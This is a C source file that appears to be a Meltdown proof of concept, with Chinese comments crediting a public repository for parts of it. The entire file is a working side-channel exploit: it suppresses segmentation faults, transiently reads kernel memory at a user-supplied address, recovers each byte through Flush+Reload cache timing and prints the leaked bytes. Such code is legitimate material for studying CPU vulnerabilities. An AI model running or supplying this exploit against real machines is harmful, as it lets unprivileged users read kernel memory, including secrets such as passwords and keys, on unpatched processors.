#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include <stdint.h>
#define PAGE_SIZE	1024 * 4
#define PAGE_NUM	256
#define LEAK 1000
#define AVE_N 100000

char pages[PAGE_NUM * PAGE_SIZE];
int32_t cache_hit_counts[PAGE_NUM];
int32_t HitTime;
extern char stop_probe[];

//cpu控制  ，代码引用自： https://gitee.com/idea4good/meltdown/blob/master/meltdown.c 
static void pin_cpu0()
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(0, &mask);
	sched_setaffinity(0, sizeof(cpu_set_t), &mask);
}

//以下两个函数为信号设置，代码引用自： https://gitee.com/idea4good/meltdown/blob/master/meltdown.c 
static void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stop_probe;
}

static int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

int32_t access_time(volatile char *addr)
{
	int32_t t1, t2, a;
	a;
	t1 = __rdtscp(&a);
	*addr;
	t2 = __rdtscp(&a);
	return t2-t1;
}

int32_t TimeOfHitCache()
{
	int32_t sumtime_cache=0, sumtime_mem=0;
	int32_t avetime_cache, avetime_mem;
	int32_t i;
	access_time(pages);
	for(i = 0; i < AVE_N; i++)
		sumtime_cache += access_time(pages);	
	avetime_cache = sumtime_cache / AVE_N;
	for(i = 0; i < AVE_N; i++)
	{
		_mm_clflush(pages);
		sumtime_mem += access_time(pages);
	}
	avetime_mem = sumtime_mem / AVE_N;
	return 2*avetime_cache;
}

void flpages(void)
{
	for (int i = 0; i < PAGE_NUM; i++)
		_mm_clflush(&pages[i * PAGE_SIZE]);
}

void accelerate()
{
	char buf[256];
	int32_t fd;
	if (fd = open("/proc/version", O_RDONLY)< 0) {
		perror("open error");
		return;
	}
	if (pread(fd, buf, sizeof(buf), 0) < 0)
		perror("pread error");  
	close(fd);
}

void leak(unsigned long addr)
{ 
    accelerate(); 
	asm volatile (
		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"movzx (%[pages], %%rax, 1), %%rbx\n"
		"stop_probe: \n\t"
		"nop\n\t"
		:
		: [pages] "r" (pages),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}

void add_cache_counts()
{
	int i, t;
	volatile char *addr;
	for (i = 0; i < PAGE_NUM; i++) {
		addr = &pages[i * PAGE_SIZE];
		t = access_time(addr);
		if (t <= HitTime)
			cache_hit_counts[i]++;
	}
}

int hack(unsigned long addr)
{
	int32_t data = -1, max = -1, maxhit = -1;
	memset(cache_hit_counts, 0, sizeof(cache_hit_counts));
	for(int i = 0; i < LEAK; i++)
	{
		flpages();
		leak(addr);
		add_cache_counts();
	}
	//以上是数据收集统计，以下是信息分析 
	for(int i = 0; i< PAGE_NUM; i++)
	{
		if(cache_hit_counts[i] && cache_hit_counts[i] > max)
		{
			max = cache_hit_counts[i];
			maxhit = i;
		}
	}
	return maxhit;
}

int initial()
{
	//以下两个函数进行了代码引用 ,代码引用自： https://gitee.com/idea4good/meltdown/blob/master/meltdown.c
	set_signal();
	pin_cpu0();
	memset(pages, 0, sizeof(pages));
	return 0;
}

void hack_process(unsigned long addr_offset, unsigned long read_size, int32_t HitTime)
{
	printf("Something bad is happening...");
	for(int i = 0; i < read_size; i++)
	{
		int32_t data;
		data = hack(addr_offset + i);
		if (data == -1)
			data = 0xff;
		if(i == 0)
			printf("\n|leak %lx ", addr_offset + i);
		if(i % 8 == 0 && i != 0)
			printf("|\n|leak %lx ", addr_offset + i);
		printf("%2x:%c ",data, isprint(data) ? data : ' ');
	}
	printf("|\n");
}

int main(int argc, char *argv[])
{
	unsigned long addr_offset, read_size;
	sscanf(argv[1], "%lx", &addr_offset);
	sscanf(argv[2], "%lx", &read_size);
	initial();
	//cachehit时间的判定 
	HitTime = TimeOfHitCache();
	//进行内核内容的泄漏 
	hack_process(addr_offset, read_size, HitTime);	
	return 0;
}
